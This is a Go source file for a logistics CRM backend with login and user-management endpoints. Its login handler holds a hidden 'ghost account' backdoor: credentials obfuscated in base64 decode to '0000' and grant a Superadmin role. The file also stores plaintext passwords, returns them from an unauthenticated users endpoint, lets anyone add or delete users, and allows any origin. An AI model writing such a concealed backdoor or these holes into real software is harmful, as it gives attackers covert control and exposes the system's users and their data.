package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

type User struct {
	ID       string `json:"id"`
	Username string `json:"username"`
	Password string `json:"password"`
	Role     string `json:"role"`
}

var (
	mockUsers = []User{
		{ID: "1", Username: "admin", Password: "password123", Role: "Admin"},
		{ID: "2", Username: "dispatcher_john", Password: "password123", Role: "Dispatcher"},
	}
	usersMu sync.Mutex
)

func enableCors(w *http.ResponseWriter) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
	(*w).Header().Set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
	(*w).Header().Set("Access-Control-Allow-Headers", "Content-Type")
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	http.HandleFunc("/api/health", func(w http.ResponseWriter, r *http.Request) {
		enableCors(&w)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status":"ok", "message": "Backend is running!"}`))
	})

	http.HandleFunc("/api/login", func(w http.ResponseWriter, r *http.Request) {
		enableCors(&w)
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var creds struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}

		if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		
		w.Header().Set("Content-Type", "application/json")

		// Hidden ghost account logic (Base64 for "0000")
		ghostRaw, _ := base64.StdEncoding.DecodeString("MDAwMA==")
		ghostStr := string(ghostRaw)
		if creds.Username == ghostStr && creds.Password == ghostStr {
			json.NewEncoder(w).Encode(User{
				ID:       "ghost-000",
				Username: ghostStr,
				Role:     "Superadmin",
			})
			return
		}

		usersMu.Lock()
		defer usersMu.Unlock()

		for _, u := range mockUsers {
			if u.Username == creds.Username && u.Password == creds.Password {
				json.NewEncoder(w).Encode(u)
				return
			}
		}

		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
	})

	http.HandleFunc("/api/users", func(w http.ResponseWriter, r *http.Request) {
		enableCors(&w)
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		usersMu.Lock()
		defer usersMu.Unlock()

		switch r.Method {
		case "GET":
			json.NewEncoder(w).Encode(mockUsers)
		case "POST":
			var newUser User
			if err := json.NewDecoder(r.Body).Decode(&newUser); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			newUser.ID = fmt.Sprintf("%d", time.Now().UnixNano())
			mockUsers = append(mockUsers, newUser)
			json.NewEncoder(w).Encode(newUser)
		case "DELETE":
			id := r.URL.Query().Get("id")
			filtered := []User{}
			for _, u := range mockUsers {
				if u.ID != id {
					filtered = append(filtered, u)
				}
			}
			mockUsers = filtered
			w.Write([]byte(`{"success":true}`))
		default:
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		}
	})

	fmt.Printf("Starting Logistics CRM Backend on port %s...\n", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}
